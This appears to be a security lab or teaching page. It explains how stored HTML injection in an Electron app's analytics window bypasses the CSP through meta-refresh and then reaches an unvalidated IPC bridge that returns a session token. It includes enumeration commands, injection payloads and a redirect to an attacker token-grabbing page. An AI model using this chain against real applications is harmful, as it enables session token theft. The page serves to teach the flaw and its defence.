Stored HTML Injection → IPC Token Exfiltration

CSP blocks XSS but not meta-refresh; preload bridge has no sender validation

✓ NodeIntegration: false ✓ ContextIsolation: true ✓ Sandbox: true ✓ CSP: script-src * ✗ IPC Sender Validation: none

Guide: What is happening?

A user's display name is stored and rendered inside an in-app analytics window using innerHTML, without sanitization. The analytics window has a Content-Security-Policy that blocks inline scripts and event handlers — so direct XSS is prevented. However, HTML injection still works because <meta http-equiv="refresh"> is not a script and is not covered by any CSP directive.

The analytics window's preload exposes a getToken() IPC bridge with no sender validation. Any page loaded in that window — including an attacker's redirect target — can call it freely.

Attack Chain

0
Reconnaissance — enumerate exposed IPC bridges

Before crafting a payload, an attacker discovers what APIs are available via two methods:

DevTools console — This app opens DevTools on every analytics window (a common Electron development practice that often ships to production). Open the window with any benign name, then in its console: 

// Find what the preload added to window
Object.keys(window).filter(k => typeof window[k] === 'object' && window[k] !== null)
// → [..., "analyticsAPI", ...]

// Enumerate its methods
Object.keys(window.analyticsAPI)
// → ["onName", "getToken"]

contextBridge.exposeInMainWorld('analyticsAPI', ...) sets a property directly on window, so it shows up alongside every standard browser global. Typing window. in DevTools and waiting for autocomplete reveals it immediately.

ASAR extraction — Electron apps ship source inside an app.asar archive. Anyone can extract it with: 

npx asar extract app.asar ./out

All preload scripts are readable in plaintext, including exactly which IPC channels are registered.

1
Stage 1 — Try XSS first BLOCKED BY CSP 
<img src=x onerror="window.location.href='https://example.com'">
The CSP (script-src *) blocks the inline onerror handler. The analytics window opens but the redirect never fires. Check DevTools console for the CSP violation report.
2
Stage 2 — HTML injection bypasses CSP CSP BYPASS 
<meta http-equiv="refresh" content="0;URL=https://example.com">
No JavaScript — pure HTML. CSP does not cover meta-refresh. The analytics window redirects to an external site. There is no address bar, so the user has no signal the window is no longer inside the legitimate app.
3
Stage 3 — Escalation: token exfiltration via unvalidated IPC bridge ESCALATION 
<meta http-equiv="refresh" content="0;URL=attacker-grab-token.html">
Same HTML injection redirects to the attacker page. The preload is still active — it is bound to the window, not the URL. The attacker page calls window.analyticsAPI.getToken() and the main process returns the session token with no validation.
Why this matters in a desktop app: In a browser, an open redirect is low-severity because the address bar reveals the destination. In an Electron app there is no address bar — the user has no signal that the window has navigated away. Combined with an unvalidated IPC bridge, this escalates from HTML injection to full session token exfiltration without any JavaScript execution on the vulnerable page.
